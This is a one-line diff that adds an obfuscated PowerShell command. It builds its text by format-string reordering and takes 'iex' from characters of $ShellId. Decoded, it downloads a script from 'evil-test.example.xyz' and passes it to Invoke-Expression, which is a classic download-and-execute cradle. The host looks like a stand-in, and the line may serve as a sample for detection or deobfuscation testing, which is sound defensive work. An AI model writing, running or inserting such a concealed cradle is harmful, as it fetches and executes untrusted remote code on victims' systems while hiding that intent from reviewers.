@@ -1,0 +1,1 @@
+.($ShellId[1]+$ShellId[13]+'x') ("{9}{8}{11}{0}{5}{12}{10}{3}{7}{4}{1}{6}{2}" -f 'New-Objec','ple.xyz/p','iex','ring(''htt','test.exam','t Net.Web','.ps1'') | ','p://evil-','t ''stage-','Write-Hos','ownloadSt','final''; (','Client).D')
